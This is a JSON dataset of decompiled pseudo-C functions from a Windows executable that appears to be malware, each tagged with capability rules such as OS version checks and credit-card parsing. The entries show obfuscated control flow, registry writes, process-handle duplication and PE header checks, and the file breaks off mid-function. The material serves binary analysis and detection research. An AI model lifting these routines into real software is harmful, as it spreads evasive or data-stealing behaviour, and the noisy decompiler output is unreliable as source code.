{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.00401000(void)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 65
    },
    "00401c70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint64_t fcn.00401c70(void)\n\n{\n    uint32_t extraout_EDX;\n    uint32_t uVar1;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    uVar1 = (extraout_EDX >> 8 & 0xffff00) << 8 | extraout_EDX & 0xffff;\n    if (var_90h == 5) {\n        return CONCAT44(uVar1, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(uVar1, 1);\n    }\n    return uVar1 << 0x20;\n}\n",
        "token_count": 189
    },
    "00402080": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402080(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401ff0(0x80000002, 0x4071dc, 0x407228, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402cc0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f51) overlaps instruction at (ram,0x00402f50)\n// \n// WARNING: Removing unreachable block (ram,0x00402e2f)\n// WARNING: Removing unreachable block (ram,0x00402e34)\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00402cc0(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    char extraout_CL;\n    uint8_t uVar7;\n    char extraout_CH;\n    char extraout_CH_00;\n    ushort extraout_CX;\n    char extraout_CH_01;\n    ushort extraout_CX_00;\n    ushort uVar8;\n    ushort extraout_CX_01;\n    uint8_t uVar9;\n    int32_t *piVar10;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint *unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    bool bVar13;\n    char cVar14;\n    char cVar15;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar16;\n    uint64_t uVar17;\n    uint uVar18;\n    uint32_t uStack59;\n    uchar uStack44;\n    uchar uStack43;\n    uint uStack42;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    ushort uStack30;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    ushort uStack14;\n    \n    uStack16 = 0x11;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack20 = 0x14;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xc;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x34;\n    uStack27 = 0x17;\n    uStack26 = 0x41;\n    uStack25 = 0;\n    uStack32 = 0xe3;\n    uStack31 = 0x2c;\n    uStack30 = 0x40;\n    fcn.00402590();\n    uStack16 = 0xf;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack20 = 0x30;\n    uStack19 = 0x72;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xc;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x34;\n    uStack27 = 0x17;\n    uStack26 = 0x41;\n    uStack25 = 0;\n    uStack32 = 0x10;\n    uStack31 = 0x2d;\n    uStack30 = 0x40;\n    fcn.00402590();\n    uStack36 = SUB41(unaff_EBP, 0);\n    uStack35 = unaff_EBP >> 8;\n    uStack34 = unaff_EBP >> 0x10;\n    uStack33 = unaff_EBP >> 0x18;\n    uStack38 = unaff_ESI >> 0x10;\n    uStack37 = unaff_ESI >> 0x18;\n    uStack44 = unaff_EDI;\n    uStack43 = unaff_EDI >> 8;\n    uVar3 = unaff_EBX & 0xffffff;\n    uStack16 = 0x1a;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack20 = 0x40;\n    uStack19 = 0x72;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xc;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x34;\n    uStack27 = 0x17;\n    uStack26 = 0x41;\n    uStack25 = 0;\n    uStack32 = 0x42;\n    uStack31 = 0x2d;\n    uStack30 = 0x40;\n    fcn.00402590();\n    uStack28 = 10;\n    uStack27 = 0;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack32 = 0x94;\n    uStack31 = 0x72;\n    uStack30 = 0x40;\n    uStack36 = 0xc;\n    uStack35 = 0;\n    uStack34 = 0;\n    uStack33 = 0;\n    uStack38 = 0x41;\n    uStack37 = 0;\n    fcn.00402590();\n    uStack16 = 0xa0;\n    uStack15 = 0x72;\n    uStack14 = 0x40;\n    uStack20 = 0xc;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack24 = 0x34;\n    uStack23 = 0x17;\n    uStack22 = 0x41;\n    uStack21 = 0;\n    uStack28 = 0x97;\n    uStack27 = 0x2d;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar4 = fcn.00402590();\n    bVar13 = (POPCOUNT((unaff_EDI & uVar4) + 0xaf70 & 0xc) & 1U) == 0;\n    uStack16 = 0xac;\n    uStack15 = 0x72;\n    uStack14 = 0x40;\n    uStack20 = 0xc;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack24 = 0x34;\n    uStack23 = 0x17;\n    uStack22 = 0x41;\n    uStack21 = 0;\n    uStack28 = 0xd2;\n    uStack27 = 0x2d;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar16 = fcn.00402590();\n    iVar5 = uVar16 >> 0x20;\n    if ((bVar13) || (!bVar13)) {\n        uStack36 = 0xc;\n        uStack35 = 0;\n        uStack34 = 0;\n        uStack33 = 0;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        unaff_EBP = *0x6a17b43a;\n        *(iVar5 + -0x4b) = *(iVar5 + -0x4b) | unaff_EBP;\n        iVar5 = uVar16;\n    }\n    *(iVar5 + 0xc) = *(iVar5 + 0xc) + extraout_CH;\n    uStack28 = 0x34;\n    uStack27 = 0x17;\n    uStack26 = 0x41;\n    uStack25 = 0;\n    uStack32 = 0xfc;\n    uStack31 = 0x2d;\n    uStack30 = 0x40;\n    fcn.00402590();\n    uStack20 = SUB41(unaff_EBP, 0);\n    uStack19 = unaff_EBP >> 8;\n    uStack18 = unaff_EBP >> 0x10;\n    uStack17 = unaff_EBP >> 0x18;\n    uStack24 = unaff_ESI;\n    uStack23 = unaff_ESI >> 8;\n    uStack22 = unaff_ESI >> 0x10;\n    uStack21 = unaff_ESI >> 0x18;\n    uStack26 = unaff_EDI >> 0x10;\n    uStack25 = unaff_EDI >> 0x18;\n    uStack16 = 0x19;\n    uStack15 = 0x2e;\n    uStack14 = 0x40;\n    uStack28 = uStack44;\n    uStack27 = uStack43;\n    uVar16 = fcn.00402590();\n    piVar10 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = extraout_ST0;\n    uStack16 = uVar3;\n    uStack15 = uVar3 >> 8;\n    uStack14 = unaff_EBX >> 0x10;\n    *piVar10 = *piVar10 + 0x96adf84;\n    uStack20 = 0xcc;\n    uStack19 = 0x72;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xc;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x34;\n    uStack27 = 0x17;\n    uStack26 = 0x41;\n    uStack25 = 0;\n    uStack32 = 0x41;\n    uStack31 = 0x2e;\n    uStack30 = 0x40;\n    fcn.00402590();\n    uStack16 = 0x6c;\n    uStack15 = 0x2e;\n    uStack14 = 0x40;\n    fcn.00402590();\n    uStack22 = 3;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack19 = 0;\n    uStack26 = 0xe4;\n    uStack25 = 0x72;\n    uStack24 = 0x40;\n    uStack23 = 0;\n    uStack30 = 0xc;\n    uStack28 = 0;\n    uStack27 = 0;\n    uStack34 = 0x34;\n    uStack33 = 0x17;\n    uStack32 = 0x41;\n    uStack31 = 0;\n    uStack38 = 0x9f;\n    uStack37 = 0x2e;\n    uStack36 = 0x40;\n    uStack35 = 0;\n    fcn.00402590();\n    bVar13 = (POPCOUNT(extraout_CL + -1) & 1U) == 0;\n    uStack22 = 10;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack19 = 0;\n    uStack26 = 0xe8;\n    uStack25 = 0x72;\n    uStack24 = 0x40;\n    uStack23 = 0;\n    uStack30 = 0xc;\n    uStack28 = 0;\n    uStack27 = 0;\n    uStack34 = 0x34;\n    uStack33 = 0x17;\n    uStack32 = 0x41;\n    uStack31 = 0;\n    uStack38 = 0xcf;\n    uStack37 = 0x2e;\n    uStack36 = 0x40;\n    uStack35 = 0;\n    fcn.00402590();\n    if ((!bVar13) && (bVar13)) {\n        puVar12 = &uStack38;\n        cVar14 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *unaff_EBP;\n            cVar14 = cVar14 + -1;\n        } while ('\\0' < cVar14);\n        iVar5 = in(0x78);\n        return iVar5;\n    }\n    uStack38 = 0x40;\n    uStack37 = 0;\n    uStack36 = 0;\n    uStack35 = 0;\n    fcn.00402590();\n    fcn.00402590();\n    uStack19 = 0xb;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack23 = 0x40;\n    uStack22 = 0x73;\n    uStack21 = 0x40;\n    uStack20 = 0;\n    uStack27 = 0xc;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x34;\n    uStack30 = 0x4117;\n    uStack28 = 0;\n    uStack35 = 0x4a;\n    uStack34 = 0x2f;\n    uStack33 = 0x40;\n    uStack32 = 0;\n    fcn.00402590();\n    bVar13 = false;\n    uStack19 = 4;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack23 = 0x4c;\n    uStack22 = 0x73;\n    uStack21 = 0x40;\n    uStack20 = 0;\n    uStack27 = 0xc;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x34;\n    uStack30 = 0x4117;\n    uStack28 = 0;\n    uStack35 = 0x7f;\n    uStack34 = 0x2f;\n    uStack33 = 0x40;\n    uStack32 = 0;\n    puVar6 = fcn.00402590();\n    if ((!bVar13) && (bVar13)) {\n        if (&uStack31 < *puVar6 || puVar6 + 1 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        return puVar6 + 1;\n    }\n    uStack35 = 4;\n    uStack34 = 0;\n    uStack33 = 0;\n    uStack32 = 0;\n    uStack38 = 0x73;\n    uStack37 = 0x40;\n    uStack36 = 0;\n    fcn.00402590();\n    uStack19 = 0xc;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack23 = 0x54;\n    uStack22 = 0x73;\n    uStack21 = 0x40;\n    uStack20 = 0;\n    uStack27 = 0xc;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x34;\n    uStack30 = 0x4117;\n    uStack28 = 0;\n    uStack35 = 0xe2;\n    uStack34 = 0x2f;\n    uStack33 = 0x40;\n    uStack32 = 0;\n    fcn.00402590();\n    cVar15 = false;\n    cVar14 = '\\0';\n    uStack19 = 4;\n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack23 = 0x60;\n    uStack22 = 0x73;\n    uStack21 = 0x40;\n    uStack20 = 0;\n    uStack27 = 0xc;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x34;\n    uStack30 = 0x4117;\n    uStack28 = 0;\n    uStack35 = 0xc;\n    uStack34 = 0x30;\n    uStack33 = 0x40;\n    uStack32 = 0;\n    iVar5 = fcn.00402590();\n    if ((!cVar15) && (cVar15)) {\n        LOCK();\n        cVar15 = SCARRY4(iVar5, 0x658f517f);\n        cVar14 = iVar5 + 0x658f517f < 0;\n    }\n    uStack35 = 9;\n    uStack34 = 0;\n    uStack33 = 0;\n    uStack32 = 0;\n    uStack38 = 0x73;\n    uStack37 = 0x40;\n    uStack36 = 0;\n    uVar17 = fcn.00402590();\n    iVar5 = uVar17 >> 0x20;\n    if (((cVar15 != cVar14) || (cVar15 == cVar14)) || (iVar5 = uVar17,  uVar17 < 0x7068166a00000000)) {\n        *(iVar5 + 0xc) = *(iVar5 + 0xc) + extraout_CH_00;\n        fcn.00402590();\n        iVar5 = fcn.00402590(0x411734);\n        return iVar5;\n    }\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    bVar13 = false;\n    uStack59 = 0x411734;\n    uVar16 = fcn.00402590();\n    if (((bVar13) || (!bVar13)) || (uVar11 = unaff_EBX,  uVar8 = extraout_CX,  uVar16 != -0x868126a)) {\n        pcVar1 = (uVar16 >> 0x20) + 0xc;\n        *pcVar1 = *pcVar1 + (extraout_CX >> 8);\n        bVar13 = *pcVar1 < '\\0';\n        uVar18 = 0x411734;\n        fcn.00402590();\n        if ((bVar13) || (!bVar13)) {\n            uVar18 = 0xc;\n        }\n        *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + extraout_CH_01;\n        iVar5 = fcn.00402590(0x411734, uVar18);\n        uVar11 = (uVar3 ^ 0x70c5) - iVar5;\n        uVar8 = extraout_CX_00;\n        uStack59 = unaff_EBX;\n    }\n    uVar9 = uVar11 >> 8 | uVar8 >> 8;\n    uVar7 = uVar8;\n    cVar15 = SBORROW1(uVar9, uVar7);\n    cVar14 = uVar9 - uVar7 < '\\0';\n    bVar13 = uVar9 == uVar7;\n    uVar16 = fcn.00402590();\n    iVar5 = uVar16 >> 0x20;\n    uVar9 = extraout_CX_01 >> 8;\n    if ((!bVar13 && cVar15 == cVar14) && (bVar13 || cVar15 != cVar14)) {\n        uStack59 = uStack59 + 1;\n        puVar2 = uVar16 + 0x6a39da56;\n        *puVar2 = *puVar2 ^ extraout_CX_01;\n        puVar2 = uVar16 + 0x34;\n        *puVar2 = *puVar2 | uVar9;\n        if (*puVar2 == 0) {\n            pcVar1 = iVar5 + 0xc;\n            *pcVar1 = *pcVar1 + uVar9;\n            goto code_r0x00403239;\n        }\n    }\n    pcVar1 = iVar5 + 0xc;\n    *pcVar1 = *pcVar1 + uVar9;\n    fcn.00402590(0x411734);\n    fcn.00402590(0x411734, 0xc, 0x40743c, 8);\ncode_r0x00403239:\n    uVar16 = fcn.00402590();\n    piVar10 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = extraout_ST0_00;\n    *piVar10 = *piVar10 + 0x76adf84;\n    fcn.00402590(0x411734, 0xc, 0x40744c, uStack59);\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    iVar5 = fcn.00402590(0x411734, 0xc, 0x40748c, 8);\n    return iVar5;\n}\n",
        "token_count": 4814
    },
    "00403600": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004036bc) overlaps instruction at (ram,0x004036b3)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403600(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    uint32_t in_EDX;\n    char in_SF;\n    char in_OF;\n    uint var_4h;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        pcVar1 = (in_EDX & 0xffffff00 | in_EDX + (in_ECX >> 8)) ^ 0x14;\n        *pcVar1 = *pcVar1 + pcVar1;\n    }\n    else {\n        pcVar1 = fcn.00404a50(0x407080);\n    }\n    if (pcVar1 == 0xffffffff) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar2, 0, 0, 0, 2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    if (iVar4 != 0) {\n        *(iVar2 + 0x43d1773a) = *(iVar2 + 0x43d1773a) ^ 0x5627e95e;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 392
    },
    "00404730": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047ab) overlaps instruction at (ram,0x004047aa)\n// \n// WARNING: Removing unreachable block (ram,0x004047ab)\n// WARNING: Removing unreachable block (ram,0x004047b5)\n// WARNING: Removing unreachable block (ram,0x004047be)\n// WARNING: Removing unreachable block (ram,0x004047fe)\n\nuint __cdecl fcn.00404730(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar6 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_164h = '\\0';\n    puVar6 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    if ((-1 < arg_ch) && (-1 >= arg_ch)) {\n        out(0xc4, arg_ch);\n        *(puVar6 + 3) = arg_ch;\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x407090, arg_8h);\n    (*pcVar2)(&var_268h, 0x4070a8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar7 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x4070d0;\n    var_34h = 0x4070dc;\n    var_30h = 0x4070e8;\n    var_2ch = 0x4070f8;\n    var_28h = 0x407100;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    uVar4 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    if (*(uVar4 - 0x10) < 5) {\n        uVar5 = *(uVar4 - 0x10) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, uVar4 - 0x268, *((uVar4 - 0x38) + uVar5), *((uVar4 - 0x60) + uVar5), \n                              *((uVar4 - 0x4c) + uVar5), *((uVar4 - 0x24) + uVar5));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1304
    },
    "00401070": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nbool fcn.00401070(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&var_10ch, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&var_10ch);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 298
    },
    "004020d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402266) overlaps instruction at (ram,0x00402264)\n// \n// WARNING: Removing unreachable block (ram,0x00402232)\n\nuint fcn.004020d0(uint param_1, int32_t param_2, uint param_3, int32_t param_4, uint *param_5, uint param_6, \n                 uint *param_7)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t *piVar5;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint8_t in_AF;\n    char cVar9;\n    bool bVar10;\n    char cVar11;\n    ulong uVar12;\n    uint64_t uVar13;\n    uint uVar14;\n    uint *puVar15;\n    uint uStack272;\n    uchar auStack13 [4];\n    uint uStack9;\n    \n    bVar10 = false;\n    puVar15 = param_5;\n    iVar3 = fcn.00401ac0(param_5, param_6, param_1, 0x20, param_7 + 8);\n    if ((bVar10) || (!bVar10)) {\n        puVar6 = param_7 + 0x18;\n        puVar8 = param_5;\n    }\n    else {\n        param_2 = iVar3 + 1;\n        *param_5 = *param_7;\n        puVar6 = 0x8d0c458b;\n        param_7 = param_7 + 1;\n        puVar8 = param_5 + 1;\n    }\n    uVar12 = fcn.00401ac0(puVar8, param_6, param_2, 0x20, puVar6);\n    cVar11 = '\\0';\n    uVar7 = (uVar12 >> 0x20 & 0xffffff00 | extraout_CH) & uVar12;\n    cVar9 = uVar7 < 0;\n    bVar10 = uVar7 == 0;\n    uVar14 = 0x20;\n    puVar8 = param_5;\n    puVar6 = fcn.00401ac0(param_5, param_6, param_3, 0x20, param_7 + 0x28);\n    if ((bVar10 || cVar11 != cVar9) || (iVar3 = extraout_ECX,  !bVar10 && cVar11 == cVar9)) {\n        puVar6 = param_7 + 0x38;\n        iVar3 = param_4;\n    }\n    *(puVar6 + -0x74c625aa) = *(puVar6 + -0x74c625aa) ^ iVar3;\n    cVar9 = puVar6 >> 8;\n    pcVar4 = puVar6 & 0xffff0000 | CONCAT11(puVar6 + -0x73, cVar9);\n    *pcVar4 = *pcVar4 + cVar9;\n    pcVar4[0x6a] = pcVar4[0x6a] + extraout_DL;\n    *(iVar3 + 0x53) = *(iVar3 + 0x53) & extraout_DL;\n    fcn.00401ac0(param_5, puVar8, param_6, param_3, uVar14);\n    iVar3 = fcn.00402080();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(param_7 + 0x48) = iVar3 % 5;\n    }\n    else {\n        *(param_7 + 0x48) = iVar3;\n    }\n    puVar6 = &uStack272;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    uStack9 = 0x104;\n    puVar8 = puVar6 + 3;\n    *(puVar6 + 2) = 0;\n    uVar13 = fcn.00401ff0(0x80000001, 0x40725c, 0x407288, auStack13, &stack0xfffffeef, &uStack9);\n    iVar3 = extraout_ECX_00;\n    if (uVar13 != 0) {\n        uVar13 = (*_sym.imp.MSVCRT.dll__stricmp)(&stack0xfffffeef);\n        uVar7 = uVar13;\n        bVar10 = (POPCOUNT(uVar7 & 0xff) & 1U) != 0;\n        iVar3 = extraout_ECX_01;\n        if (uVar7 == 0) {\n            if ((bVar10) && (!bVar10)) {\n                out(*param_7, uVar13 >> 0x20);\n                do {\n                    cVar9 = uVar7 >> 8;\n                    in_AF = 9 < (uVar7 & 0xf) | in_AF;\n                    uVar7 = CONCAT31(CONCAT21(uVar7 >> 0x10, cVar9 - in_AF), -in_AF);\n                    uVar2 = uVar13 & 0xffffffff00000000 | uVar7;\n                } while (in_AF || cVar9 == *(uVar13 >> 0x20));\n                goto code_r0x00402260;\n            }\n            *(param_7 + 0x48) = *(param_7 + 0x48) | 0x80;\n        }\n    }\n    puVar8 = puVar15;\n    in_AF = 0;\n    uVar2 = uVar13;\ncode_r0x00402260:\n    piVar5 = uVar2;\n    piVar1 = puVar8 + (uVar2 >> 0x20) * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n    *(iVar3 + -0x80) = piVar5;\n    *piVar5 = *piVar5 + piVar5;\n    *(piVar5 + -0x74a4a1a1) = *(piVar5 + -0x74a4a1a1) + uVar2;\n    uVar14 = in(0x5d);\n    return uVar14;\n}\n",
        "token_count": 1504
    },
    "00403f80": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040410f) overlaps instruction at (ram,0x0040410d)\n// \n// WARNING: Removing unreachable block (ram,0x0040410c)\n\nuint __fastcall fcn.00403f80(int32_t param_1, int16_t *param_2, int16_t *param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint8_t *unaff_EBX;\n    uchar *puVar9;\n    int16_t *piVar10;\n    int16_t *piVar11;\n    int16_t *piVar12;\n    bool bVar13;\n    bool in_SF;\n    bool bVar14;\n    bool bVar15;\n    char cStack00000056;\n    uint in_stack_00000054;\n    \n    puVar9 = &stack0xfffffffc;\n    if ((in_SF) || (!in_SF)) {\n        bVar13 = *param_3 == 0x5a4d;\n        param_2 = param_3;\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        bVar13 = param_1 == cStack00000056;\n    }\n    if (!bVar13) {\n        return 0;\n    }\n    bVar13 = CARRY4(*(param_2 + 0x1e), param_2);\n    piVar4 = *(param_2 + 0x1e) + param_2;\n    if ((bVar13) || (!bVar13)) {\n        bVar15 = SBORROW4(*piVar4, 0x4550);\n        bVar14 = *piVar4 + -0x4550 < 0;\n        bVar13 = *piVar4 == 0x4550;\n    }\n    else {\n        unaff_EBX = &stack0x50388172;\n        puVar9 = &stack0xfffffffd;\n        bVar15 = SCARRY1(*piVar4, piVar4);\n        *piVar4 = *piVar4 + piVar4;\n        bVar14 = *piVar4 < '\\0';\n        bVar13 = *piVar4 == '\\0';\n    }\n    if (!bVar13) {\n        return 0;\n    }\n    if ((bVar13 || bVar15 != bVar14) || (!bVar13 && bVar15 == bVar14)) {\n        param_1 = piVar4[0x16];\n    }\n    if (param_1 != 0) {\n        return 0;\n    }\n    piVar10 = 0x40;\n    iVar2 = *(puVar9 + 8);\n    uVar8 = *(iVar2 + 0x3c) - 0x80;\n    bVar13 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    if (*(iVar2 + 0x3c) < 0x80 || uVar8 == 0) {\n        return 0;\n    }\n    if ((bVar13) || 